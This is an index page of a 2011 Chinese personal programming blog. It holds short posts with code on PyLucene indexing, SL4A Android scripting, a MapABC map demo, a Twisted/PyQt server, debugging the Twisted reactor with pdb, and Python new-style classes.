
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>小默的研究中心</title>
  <meta name="author" content="wangxiaomo">

  
  <meta name="description" content="sql server2005安装完默认是windows验证模式.此时sa用户没有启用.这时,我们把数据库服务器改为混合认证方式.并重设sa密码.启用sa用户即可.
具体参考http://technet.microsoft.com/zh-cn/library/ms188670.aspx
">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://wangxiaomo.github.com/blog/page/6/">
  <link href="/oct/favicon.png" rel="icon">
  <link href="/oct/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <script src="/oct/javascripts/modernizr-2.0.js"></script>
  <script src="/oct/javascripts/ender.js"></script>
  <script src="/oct/javascripts/octopress.js" type="text/javascript"></script>
  <link href="/oct/blog/atom.xml" rel="alternate" title="小默的研究中心" type="application/atom+xml">
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/oct/">小默的研究中心</a></h1>
  
    <h2>Perl | PHP | Python...技术宅.微博控</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/oct/blog/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="http://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:wangxiaomo.github.com" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/oct/">Blog</a></li>
  <li><a href="/oct/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/oct/blog/2011/10/06/sql_server_%E5%90%AF%E7%94%A8sa%E7%94%A8%E6%88%B7/">Sql_server_启用sa用户</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2011-10-06T02:31:00+08:00" pubdate data-updated="true">Oct 6<span>th</span>, 2011</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>sql server2005安装完默认是windows验证模式.此时sa用户没有启用.这时,我们把数据库服务器改为混合认证方式.并重设sa密码.启用sa用户即可.
具体参考<a href="http://technet.microsoft.com/zh-cn/library/ms188670.aspx" target="_blank">http://technet.microsoft.com/zh-cn/library/ms188670.aspx</a></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/oct/blog/2011/09/21/%E6%99%BA%E8%83%BDweb%E7%BC%96%E7%A8%8B._%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95.%5Bpy%5D/">智能web编程._建立索引.[py]</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2011-09-21T12:01:00+08:00" pubdate data-updated="true">Sep 21<span>st</span>, 2011</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>虽然这样看书的进度很慢. 但是理解的应该会较为透彻吧. 而且书上的代码都是作者封装的. 感觉非常不爽. 不废话了. lucene建立索引. 数据为书中附属代码.</p>

<pre lang="python">
# html_parser.py
#-*- coding: utf-8 -*-

import sys
from string import strip
from sgmllib import SGMLParser

class HTMLParser(SGMLParser):
    def __init__(self, data):
        SGMLParser.__init__(self)
        self.lock = False
        self.title = None
        self.html = []
        self.data = data

    def start_title(self, attrs):
        if not self.lock:
            self.html = []

    def end_title(self):
        if not self.lock:
            self.title = ''.join(self.html)
            self.lock = True

    def handle_data(self, text):
        text = strip(text)
        if text:
            self.html.append(strip(text))

    def parse(self):
        self.feed(self.data)
        self.close()
        return [self.title, ' '.join(self.html)]

    def __str__(self):
        self.html = list(set(self.html))
        return ''.join(self.html)

def test():
    file = open("1.html")
    data = file.read()
    file.close()
    parse = HTMLParser(data)
    print parse.parse()

if __name__ == '__main__':
    test()
</pre>


<pre lang="python">
# IndexFiles.py
#-*- coding: utf-8 -*-

import os
import lucene
from html_parser import HTMLParser

def log(msg):
    print "====>%s" % msg


class IndexFiles(object):
    def __init__(self, sourcepath, indexpath):
        lucene.initVM(lucene.CLASSPATH)
        self.sourcepath = os.path.abspath(sourcepath)
        self.indexpath = os.path.abspath(indexpath)
        log(self.sourcepath)
        log(self.indexpath)

    def run(self):
        path = lucene.FSDirectory.getDirectory(self.indexpath, True)
        writer = lucene.IndexWriter(path, lucene.StandardAnalyzer(), True)
        for root,dirname,filenames in os.walk(self.sourcepath):
            for filename in filenames:
                abspath = os.path.join(root, filename)
                log("Add File %s ..." % abspath)
                file = open(abspath)
                data = file.read()
                file.close()
                parser = HTMLParser(data)
                title, content = parser.parse()
                doc = lucene.Document()
                doc.add(lucene.Field("title", title,
                    lucene.Field.Store.YES, lucene.Field.Index.NO))
                doc.add(lucene.Field("path", abspath, 
                    lucene.Field.Store.YES, lucene.Field.Index.NO))
                doc.add(lucene.Field("content", content,
                    lucene.Field.Store.NO, lucene.Field.Index.TOKENIZED))
                writer.addDocument(doc)
        writer.optimize()
        writer.close()

def test():
    obj = IndexFiles('./doc', './index')
    obj.run()

if __name__ == '__main__':
    test()
</pre>


<pre lang="python">
# SearchFile.py
#-*- coding: utf-8 -*-

import os
import lucene

def log(msg):
    print "====> %s" % msg

class SearchFile(object):
    def __init__(self, indexpath, keyword):
        lucene.initVM(lucene.CLASSPATH)
        self.indexpath = indexpath
        self.keyword = keyword

    def run(self):
        abspath = os.path.abspath(self.indexpath)
        searcher = lucene.IndexSearcher(abspath)
        query = lucene.QueryParser("content", lucene.StandardAnalyzer()). \
            parse(self.keyword)
        hits = searcher.search(query)
        log("Found %d" % hits.length())
        for i in range(0, hits.length()):
            doc = hits.doc(i)
            log(doc.get("title"))
            log(doc.get("path"))

def test():
    indexpath = "./index"
    keyword = raw_input("Key: ")
    obj = SearchFile(indexpath, keyword)
    obj.run()

if __name__ == '__main__':
    test()
</pre>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/oct/blog/2011/09/21/pylucene_%E4%BD%BF%E7%94%A8/">Pylucene_使用</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2011-09-21T09:12:00+08:00" pubdate data-updated="true">Sep 21<span>st</span>, 2011</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>今天总算把pylucene搞定了. 恩. 建立索引和查找都理解了, 而且对中文的处理也搞定了.
建立索引过程中比较重要的类是.</p>

<pre lang="bash">
1.IndexWriter
2.StandardAnalyzer
3.Document
</pre>


<p>IndexWriter是建立索引过程的总控制. Analyzer是分词的分析器. 有好几种具体的 Analyzer. 具体情况具体对待. 然后就是针对单个文档通过Document建立虚拟文档,加入到IndexWriter中,然后optimize()就可以了.
具体的看下面的代码.</p>

<pre lang="python">
#-*- coding: utf-8 -*-

import os
import lucene
#import chardet
from helper import log

#init java virtual machine
lucene.initVM(lucene.CLASSPATH)

def index(sourcepath, indexpath):
    try:
        analyzer = lucene.StandardAnalyzer()
        path = lucene.FSDirectory.getDirectory(indexpath, True)
        log(path)
        writer = lucene.IndexWriter(path, analyzer, True)
        abspath = os.path.abspath(sourcepath)

        for filename in os.listdir(abspath):
            log("index "+os.path.join(abspath, filename)+"...")
            file = open(os.path.join(abspath, filename))
            contents = file.read()
            file.close()
            doc = lucene.Document()
            doc.add(lucene.Field("path", os.path.abspath(filename), lucene.Field.Store.YES, lucene.Field.Index.NO))
            doc.add(lucene.Field("content", contents, lucene.Field.Store.NO, lucene.Field.Index.TOKENIZED))
            writer.addDocument(doc)
        writer.optimize()
        writer.close()
    except Exception as e:
        log(e)

if __name__ == '__main__':
    sourcepath = raw_input("Source Path: ")
    indexpath = raw_input("Index Path: ")
    index(sourcepath, indexpath)
</pre>


<p>以上代码有几点需要说明的.
1.关于中文处理.linux下默认为utf-8.lucene内部默认也是utf-8.所以在linux下处理中文不需要进行编码转化.
2.关于Store.YES和Store.NO和Index.NO选择.通常在索引文件中只需要存放一些能识别搜索结果的指针,如果没有特别的原因,例如需要随时获得部分内容,而原始来源不能直接访问,我们是不需要把内容放在索引文件中的.
其他的没什么好说的了. 流程大概就这样. 把握好思想..
接下来说Search索引怎么做.与Search相关的类.</p>

<pre lang="bash">
1.IndexSearcher.
2.QueryParser. or TermQuery.
3.hits元素.
</pre>


<p>看代码.</p>

<pre lang="python">
#-*- coding: utf-8 -*-
import os
import lucene
import chardet
from helper import log

lucene.initVM(lucene.CLASSPATH)

def search(indexpath, keyword):
    abspath = os.path.abspath(indexpath)
    log(abspath)
    searcher = lucene.IndexSearcher(abspath)
    term = lucene.Term("content", keyword)
    termQuery = lucene.TermQuery(term)
    hits = searcher.search(termQuery)
    """
    query = lucene.QueryParser("content",
        lucene.StandardAnalyzer()).parse(keyword)
    hits = searcher.search(query)
    """

    log(hits.length())
    for i in range(hits.length()):
        doc = hits.doc(i)
        log(doc.get("path"))

if __name__ == '__main__':
    indexpath = raw_input("index: ")
    keyword = raw_input("keyword: ")
    log(chardet.detect(keyword))
    search(indexpath, keyword)
</pre>


<p>好了. 智能web编程中的数据是英文的. 所以晚上把他的索引搞出来. 如果有时间的话, 研究下怎么引入其他的分词程序.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/oct/blog/2011/09/21/pylucene_%E5%AE%89%E8%A3%85./">Pylucene_安装.</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2011-09-21T03:16:00+08:00" pubdate data-updated="true">Sep 21<span>st</span>, 2011</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>智能web算法里面用beanshell讲解了各种算法.书的开头就讲解了java lucene的使用.不过我不想在java下学习智能算法. 所以还是寻找到python的迁移吧. 首先就是pylucene和lupy.这是lucene的两个方案.lupy是lucene的python全重写, 不依赖java, java lucene.但是跟不上版本,可用版本只到04年.而且现在已经停止更新了.而pylucene是对java lucene的一种包装,所以版本不是问题,但是离不开java lucene.
首先说安装.我是在ubuntu下进行测试的. apt-get包管理器很容易的找到pylucene.安装也很容易.但是进入python之后却找不到lucene,PyLucene等模块.[他们两者的区别不是很清楚] 通过包管理器安装失败后,我就通过源码进行编译安装. 编译过程看document/readme.html. 先编译jcc,然后编译pylucene.安装好之后python2.7没有lucene模块,python2.6有lucene模块.所以做个链接就可以用了. 包管理器安装失败不知道是不是上面这个原因..有机会再测试吧.
接下来就是跑 Sample. 恩. Sample这里出问题了. 问题就出在初始化java vm上.google了半天,没有什么合适的答案.
今天早上上网随便浏览的时候,发现了解决方案
默认是这样.</p>

<pre lang="python">
import lucene
lucene.initVM()
</pre>


<p>我们需要修改为.</p>

<pre lang="python">
import lucene
lucene.initVM(lucene.CLASSPATH)
</pre>


<p>先这样&#8230;</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/oct/blog/2011/09/18/SL4A.%60_%5BPython%5D/">SL4A.`_[Python]</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2011-09-18T12:25:00+08:00" pubdate data-updated="true">Sep 18<span>th</span>, 2011</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>最近没有什么项目, 所以随便拿起书来就阅读. ppurl上找到的pro android programming with sl4a. 随便翻阅了下, 就被第一页的一条言论吸引.quote: One is that not everyone is a fan of Java. 所以决定阅读下去&#8230;
之前较为系统的学习过android开发. 不过一直没了解过SL4A. 虽然知道可以用php直接对android进行编程.借着这次机会, 可以更加深入的了解了..
SL4A means Script Layer 4 Android.至于为什么用Script进行Android开发,文章开始已经说的很清楚了, 并不是所有的人都喜欢JAVA. 目前SL4A支持的语言有:Beanshell, JRuby, Lua, Perl, PHP, Python, and Rhino.哈哈.3P&amp;lua都支持.所以我现在已经非常看好SL4A了.[ps.目前不知道SL4A的支持程度, 具体的参见官网 <a href="http://code.google.com/p/android-scripting" target="_blank">http://code.google.com/p/android-scripting/</a>/.]SL4A once names ASE[Android Script Environment]
SL4A与Android System的交互是通过RPC和JSON来实现的.SL4A大量的使用JSON来进行数据传递.
<font color="red">SL4A环境搭建</font>
1.首先安装SL4A的环境到Android Device.
2.进入SL4A, 点击menu键.然后点击View.然后点击interpreter(解释器).默认情况下只有SHELL解释器,我们需要安装其他的python解释器
3.按menu.按add.选择python.
之后,我们就可以进入python解释器,进行测试.</p>

<pre lang="python">
import android

droid = android.Android()
droid.makeToast("Hello SL4A's World")
</pre>


<p>这样调试很麻烦,我们可以远程连接Android,通过wifi或者usb.
建立连接,首先我们需要打开Android Device上的Server.
1.进入SL4A的解释器.然后按menu,点击Start Server.
2.进入Notification. 查看Server 端口.
在电脑上.以linux说明.
1.export AP_PORT=9999
2.adb forward tcp:9999 tcp:123456</p>

<br />


<br />


<p>查看程序.</p>

<pre lang="python">
import android
from pprint import pprint as print

droid = android.Android()
apps = droid.getLaunchableApplications()
print apps.result
</pre>


<p>所有的python sl4a的api返回的都是一个具有以下三个值的object.
1.id
2.result: the return value of the api calls or null if no return
3.error.
查看手机的联系人.</p>

<pre lang="python">
import android

droid = android.Android()
contacts = droid.queryContent("content://com.android.contacts/data/phones',
        ['display_name', 'data1'], None, None, None).result
for c in contacts:
    print c
</pre>


<p>Location Service.</p>

<pre lang="python">
import android
droid = android.Android()
droid.startLocating()
info = droid.readLocation()
droid.stopLocating()
###################
#Result(id=6, result={u'network': {u'altitude': 0, u'provider': u'network', u'longitude':
#-84.480000000000004, u'time': 1296595452577L, u'latitude': 31.392499999999998, u'speed':
#0, u'accuracy': 1000}}, error=None)
###################
</pre>


<p>接下来.是关于用python建立ui方面的代码.</p>

<pre lang="python">
#建立一个输入对话框.
droid.dialogGetInput("Title", "Promopt")

#接下来建立一个包含三个按钮的对话框.
title = "Alert"
msg = "This is Message"

droid.dialogCreateAlert(title, msg)
droid.dialogSetPositiveButtonText('Yes')
droid.dialogSetNegativeButtonText('No')
droid.dialogSetNeutralButtonText('Cancel')
droid.dialogShow()
response = droid.dialogGetResponse().result

#创建一个列表对话框.
droid.dialogCreateAlert(title)
droid.dialogSetItems(['one', 'two', 'three'])
droid.dialogShow()
response = droid.dialogGetResponse().result

#创建单选按钮组的对话框.
droid.dialogCreateAlert(title)
droid.dialogSetSingleChoiceItems(['one', 'two', 'three'])
droid.dialogSetPositiveButtonText('Done')
droid.dialogShow()

#创建带有复选组的对话框.
droid.dialogCreateAlert(title)
droid.dialogSetMultiChoiceItems(['one', 'two', 'three'])
droid.dialogSetPositiveButtonText('Done')
droid.dialogShow()
droid.dialogGetResponse()
ans = droid.dialogGetSelectedItems()

#Android 进度条.
droid.dialogCreateHorizontalProgress(title,msg,100)
droid.dialogShow()
for x in range(0,99):
    time.sleep(0.1)
    droid.dialogSetCurrentProgress(x)
droid.dialogDismiss()
</pre>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/oct/blog/2011/09/18/Project4._MapABC./">Project4._MapABC.</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2011-09-18T07:54:00+08:00" pubdate data-updated="true">Sep 18<span>th</span>, 2011</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>恩. android开发本来想用googlemap sdk或者是mapabc的sdk.不过负责研究这块的童鞋进度太慢了. 所以我就大概研究了下ajax版的demo,写了一个基本的例子.在android开发中用webview来使用, 不过可能交互起来有些问题. 继续研究&#8230;</p>

<pre lang="html">
<html>
<head>
<title>mapABC Test</title>
<script type="text/javascript" src="http://app.mapabc.com/apis?&t=ajaxmap&v=2.1.2&key=c2b0f58a6f09cafd1503c06ef08ac7aeb7ddb91a96e84edc4bda15952808be329e24470521a29b9e"></script>
<script type="text/javascript">
/* api key = c2b0f58a6f09cafd1503c06ef08ac7aeb7ddb91a96e84edc4bda15952808be329e24470521a29b9e */
var mapObj;
function mapInit(){
    var mapOptions = new MMapOptions();
    mapOptions.zoom = 33;
    mapOptions.center = new MLngLat(116.397428, 39.90923)
    mapOptions.overviewMap = SHOW;
    mapOptions.scale = SHOW;
    mapOptions.returnCoordType = COORD_TYPE_OFFSET;
    mapOptions.zoomBox = true;
    mapObj = new MMap("iCenter", mapOptions);
}
function addMarker(){
    var tipOption = new MTipOptions();
    tipOption.title = "Title";
    tipOption.content = "Content"

    var labelOption = new MLabelOptions();
    labelOption.content = "Point";
    labelOption.hasBorder = true;
    labelOption.hasBackground = true;
    labelOption.labelPosition = new MPoint(10,10);

    var markerOption = new MMarkerOptions();
    markerOption.imageUrl = "http://code.mapabc.com/images/lan_1.png";
    markerOption.anchor = new MPoint(0,0);
    markerOption.imageAlign = BOTTOM_CENTER;
    markerOption.labelOption = labelOption;
    markerOption.isEditable = false;
    markerOption.tipOption = tipOption;
    markerOption.canShowTip = true;
    markerOption.rotation = "0";
    Mmarker = new MMarker(new MLngLat("116.4023", "39.90667"), markerOption);
    Mmarker.id = "mark101";
    mapObj.addOverlay(Mmarker, true);
}
</script>
</head>
<body onload="mapInit();addMarker()">
<div id="iCenter"></div>
</body>
</html>
</pre>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/oct/blog/2011/09/17/Project4._LBS_Server._%5BTwisted%2BQt%5D/">Project4._LBS_Server._[Twisted+Qt]</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2011-09-17T07:55:00+08:00" pubdate data-updated="true">Sep 17<span>th</span>, 2011</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>只贴twisted主框架的Qt界面的.</p>

<pre lang="python">
#!/usr/bin/python 
#-*- coding: utf-8 -*-

import config
from tools.helper import log
from string import rstrip
"""
终端测试,剔除回车键.后期删除.
"""

from core import anyEvent

from twisted.internet.protocol import Protocol, Factory
from twisted.internet import reactor
from twisted.internet.threads import deferToThread

class Echo(Protocol):
    """Echo Server"""
    def connectionMade(self):
        log("Connection Made")

    def connectionLost(self, reason):
        log("Connection Lost. Reason:%s\n\n" % reason.getErrorMessage())

    def dataReceived(self, data):
        log("Data Received")
        data = data.rstrip()
        log(data)
        d = deferToThread(anyEvent, [data]) 
        d.addBoth(self.send_back)

    def send_back(self, data):
        log(data)
        self.transport.write(data)
        #self.transport.loseConnection()


class EchoFactory(Factory):
    """Echo Factory"""
    def __init__(self):
        self.protocol = Echo

def serve_forever(port=config.SERVER_PORT):
    log("Serve at Port: %s\n"%port)
    reactor.listenTCP(int(port), EchoFactory())
    reactor.run()

if __name__ == '__main__':
    serve_forever()
</pre>


<p>QT</p>

<pre lang="python">
#-*- coding: utf-8 -*-

import os
import sys
from PyQt4.QtCore import *
from PyQt4.QtGui import *
from server import serve_forever

def alert(msg):
    dlg = QMessageBox()
    dlg.setWindowTitle("Alert")
    dlg.setText(msg)
    dlg.exec_()

"""
class ServerThread(QThread):
    def __init__(self, port, parent=None):
        super(ServerThread, self).__init__(parent)
        self.port = port
        self.setTerminationEnabled(True)

    def run(self):
        serve_forever(self.port)

    def endThread(self):
        self.exit(-1)

Twisted do not run in the main thread.
So system signal cannot be catched at all
that's the reason why gui cannot terminate the server thread
"""

class ServerDialog(QDialog):
    """
    Server Dialog.
    @FUNC1: set server port
    @FUNC2: start server
    @FUNC3: stop server
    @FUNC4: show server's status
    """
    def __init__(self, parent=None):
        super(ServerDialog, self).__init__(parent)
        self.port = 0
        self.daemon = None
        self.isRunning = False

        layout = QGridLayout()
        portLabel = QLabel("Server's &Port: ")
        self.portEdit = QLineEdit()
        self.portEdit.setText("8080")
        portLabel.setBuddy(self.portEdit)
        input_layout = QHBoxLayout()
        input_layout.addWidget(portLabel)
        input_layout.addWidget(self.portEdit)
        layout.addLayout(input_layout, 0, 0, 1, 3)
        self.startBtn = QPushButton("Start")
        layout.addWidget(self.startBtn, 1, 0)
        self.stopBtn = QPushButton("Stop")
        self.stopBtn.setEnabled(False)
        layout.addWidget(self.stopBtn, 1, 1)
        self.statusBtn = QPushButton("Status")
        layout.addWidget(self.statusBtn, 1, 2)
        self.setLayout(layout)
        self.setWindowTitle("Server 4 LBS Share")
        self.setFixedSize(250, 80)
        self.__init_slots()

    def __init_slots(self):
        self.connect(self.startBtn, SIGNAL("clicked()"),
            self.startService)
        self.connect(self.stopBtn, SIGNAL("clicked()"),
            self.stopService)
        self.connect(self.statusBtn, SIGNAL("clicked()"),
            self.showStatus)

    def startService(self):
        self.startBtn.setEnabled(False)
        self.stopBtn.setEnabled(True)
        self.portEdit.setReadOnly(True)
        self.port = self.portEdit.text()
        if self.isRunning == False:
            self.isRunning = True
            #self.daemon = ServerThread(self.port)
            #self.daemon.start()
            self.daemon = QProcess()
            self.daemon.start("python server.py")

    def stopService(self):
        self.startBtn.setEnabled(True)
        self.stopBtn.setEnabled(False) 
        self.portEdit.setReadOnly(False)
        if self.isRunning:
            self.isRunning = False
            #self.daemon.endThread()
            #self.daemon = None
            self.daemon.kill()

    def showStatus(self):
        if self.isRunning:
            msg = "Server is Running on Port %s" % self.port
        else:
            msg = "Server is not Running"
        alert(msg)

def test():
    app = QApplication(sys.argv)
    dialog = ServerDialog()
    dialog.show()
    app.exec_()

if __name__ == '__main__':
    test()
</pre>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/oct/blog/2011/09/10/twisted_reactor_debug/">Twisted_reactor_debug</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2011-09-10T06:37:00+08:00" pubdate data-updated="true">Sep 10<span>th</span>, 2011</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>放假什么都不想干啊&#8230; 无聊无聊无聊&#8230;趁着现在没事可干,用pdb把twisted跑一遍吧.
代码.</p>

<pre lang="python">
#!/usr/bin/python 
#-*- coding: utf-8 -*-
import pdb

from twisted.internet import reactor
pdb.set_trace()
reactor.run()
</pre>


<p>第一步,执行到reactor.run()</p>

<pre lang="python">
> /home/wxm/debug.py(7)<module>()
-> reactor.run()
(Pdb) l
  2     #-*- coding: utf-8 -*-
  3     import pdb
  4     
  5     from twisted.internet import reactor
  6     pdb.set_trace()
  7  -> reactor.run()
[EOF]
</pre>


<p>step进入,list代码.</p>

<pre lang="python">
1156 ->     def run(self, installSignalHandlers=True):
1157            self.startRunning(installSignalHandlers=installSignalHandlers)
1158            self.mainLoop()
</pre>


<p>reactor运行有好几种模式,默认装载了其中的一种模式,然后开始mainLoop.我们继续step进入 startRunning.看看里面发生了什么</p>

<pre lang="python">
1126 ->     def startRunning(self, installSignalHandlers=True):
1127            """
1128            Extend the base implementation in order to remember whether signal
1129            handlers should be installed later.
1130    
1131            @type installSignalHandlers: C{bool}
(Pdb) l
1132            @param installSignalHandlers: A flag which, if set, indicates that
1133                handlers for a number of (implementation-defined) signals should be
1134                installed during startup.
1135            """
1136            self._installSignalHandlers = installSignalHandlers
1137            ReactorBase.startRunning(self)
</pre>


<p>这里又出现了ReactorBase对象.继续step.
step into之后,</p>

<pre lang="python">
657  ->     def startRunning(self):
658             """
659             Method called when reactor starts: do some initialization and fire
660             startup events.
661     
662             Don't call this directly, call reactor.run() instead: it should take
(Pdb) l
663             care of calling this.
664     
665             This method is somewhat misnamed.  The reactor will not necessarily be
666             in the running state by the time this method returns.  The only
667             guarantee is that it will be on its way to the running state.
668             """
669             if self._started:
670                 raise error.ReactorAlreadyRunning()
671             self._started = True
672             self._stopped = False
673             threadable.registerAsIOThread()
(Pdb) l
674             self.fireSystemEvent('startup')
</pre>


<p>只是一些相关变量之类的设置.感觉作用不是很大,应该不会妨碍理解twisted mainLoop.所以我们一路n到mainLoop那里.then step into.</p>

<pre lang="python">
1161 ->     def mainLoop(self):
1162            while self._started:
1163                try:
1164                    while self._started:
1165                        # Advance simulation time in delayed event
1166                        # processors.
(Pdb) l
1167                        self.runUntilCurrent()
1168                        t2 = self.timeout()
1169                        t = self.running and t2
1170                        self.doIteration(t)
1171                except:
1172                    log.msg("Unexpected error in main loop.")
1173                    log.err()
1174                else:
1175                    log.msg('Main loop terminated.')
</pre>


<p>我们执行到</p>

<pre lang="python">
> /usr/lib/python2.7/dist-packages/twisted/internet/base.py(1167)mainLoop()
-> self.runUntilCurrent()
</pre>


<p>step into.</p>

<pre lang="python">
--Call--
> /usr/lib/python2.7/dist-packages/twisted/internet/base.py(751)runUntilCurrent()
-> def runUntilCurrent(self):
(Pdb) l
746                 return None
747     
748             return max(0, self._pendingTimedCalls[0].time - self.seconds())
749     
750     
751  ->     def runUntilCurrent(self):
752             """Run all pending timed calls.
753             """
754             if self.threadCallQueue:
755                 # Keep track of how many calls we actually make, as we're
756                 # making them, in case another call is added to the queue
(Pdb) l
757                 # while we're in this loop.
758                 count = 0
759                 total = len(self.threadCallQueue)
760                 for (f, a, kw) in self.threadCallQueue:
761                     try:
762                         f(*a, **kw)
763                     except:
764                         log.err()
765                     count += 1
766                     if count == total:
767                         break
(Pdb) l
768                 del self.threadCallQueue[:count]
769                 if self.threadCallQueue:
770                     self.wakeUp()
771     
772             # insert new delayed calls now
773             self._insertNewDelayedCalls()
774     
775             now = self.seconds()
776             while self._pendingTimedCalls and (self._pendingTimedCalls[0].time <= now):
777                 call = heappop(self._pendingTimedCalls)
778                 if call.cancelled:
(Pdb) l
779                     self._cancellations-=1
780                     continue
781     
782                 if call.delayed_time > 0:
783                     call.activate_delay()
784                     heappush(self._pendingTimedCalls, call)
785                     continue
786     
787                 try:
788                     call.called = 1
789                     call.func(*call.args, **call.kw)
(Pdb) l
790                 except:
791                     log.deferr()
792                     if hasattr(call, "creator"):
793                         e = "\n"
794                         e += " C: previous exception occurred in " + \
795                              "a DelayedCall created here:\n"
796                         e += " C:"
797                         e += "".join(call.creator).rstrip().replace("\n","\n C:")
798                         e += "\n"
799                         log.msg(e)
800     
(Pdb) l
801     
802             if (self._cancellations > 50 and
803                  self._cancellations > len(self._pendingTimedCalls) >> 1):
804                 self._cancellations = 0
805                 self._pendingTimedCalls = [x for x in self._pendingTimedCalls
806                                            if not x.cancelled]
807                 heapify(self._pendingTimedCalls)
808     
809             if self._justStopped:
810                 self._justStopped = False
811                 self.fireSystemEvent("shutdown")
</pre>


<p>一路n,这些语句都没执行.
最终执行到</p>

<pre lang="python">
1170                        self.doIteration(t)
</pre>


<p>这里开始最终的mainLoop Select循环.</p>

<pre lang="python">
93  ->      def doSelect(self, timeout):
 94             """
 95             Run one iteration of the I/O monitor loop.
 96     
 97             This will run all selectables who had input or output readiness
 98             waiting for them.
(Pdb) l
 99             """
100             while 1:
101                 try:
102                     r, w, ignored = _select(self._reads.keys(),
103                                             self._writes.keys(),
104                                             [], timeout)
105                     break
106                 except ValueError, ve:
107                     # Possibly a file descriptor has gone negative?
108                     log.err()
109                     self._preenDescriptors()
(Pdb) l
110                 except TypeError, te:
111                     # Something *totally* invalid (object w/o fileno, non-integral
112                     # result) was passed
113                     log.err()
114                     self._preenDescriptors()
115                 except (select.error, IOError), se:
116                     # select(2) encountered an error
117                     if se.args[0] in (0, 2):
118                         # windows does this if it got an empty list
119                         if (not self._reads) and (not self._writes):
120                             return
(Pdb) l
121                         else:
122                             raise
123                     elif se.args[0] == EINTR:
124                         return
125                     elif se.args[0] == EBADF:
126                         self._preenDescriptors()
127                     else:
128                         # OK, I really don't know what's going on.  Blow up.
129                         raise
130             _drdw = self._doReadOrWrite
131             _logrun = log.callWithLogger
(Pdb) l
132             for selectables, method, fdset in ((r, "doRead", self._reads),
133                                                (w,"doWrite", self._writes)):
134                 for selectable in selectables:
135                     # if this was disconnected in another thread, kill it.
136                     # ^^^^ --- what the !@#*?  serious!  -exarkun
137                     if selectable not in fdset:
138                         continue
139                     # This for pausing input when we're not ready for more.
140                     _logrun(selectable, _drdw, selectable, method, dict)
141     
142         doIteration = doSelect
</pre>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/oct/blog/2011/09/03/python_new-style_class/">Python_new-style_class</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2011-09-03T12:23:00+08:00" pubdate data-updated="true">Sep 3<span>rd</span>, 2011</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>今天在写<strong>getattr</strong>和<strong>setattr</strong>时突然发现了</p>

<pre lang="python">
class Foo:pass
</pre>


<p>和</p>

<pre lang="python">
class Foo(object):pass
</pre>


<p>他们中间是有很大的区别的.之前一直都忽略掉了.
python2.2引入了new-style class.如果一个类继承了object对象,那么它就是一个new-style class.
<b>内建的object对象.</b>
object类是所有new-style class的祖先.object对象定义了一系列特殊的方法来实现所有对象的默认行为.
静态方法<strong>new</strong>用来创造类的实例.<strong>init</strong>方法用来初始化自己.
<strong>new</strong>和<strong>init</strong>的区别:</p>

<pre lang="bash">
1.__new__是静态方法.cls.
2.__new__返回object时,__init__会自动被调用.
   否则, 不执行__init__
</pre>


<pre lang="python">
class Foo(object):
    def __new__(cls):
        print "__new__"
        return super(Foo, cls).__new__(cls)
    def __init__(self):
        print "__init__"
        self.x = 4
    def __str__(self):
        return self.x

x = Foo()
print x
</pre>


<p><strong>setattr</strong>,<strong>getattr</strong>,<strong>getattribute</strong>,<strong>delattr</strong>来处理类的属性.
现在重点来讲解下这个.
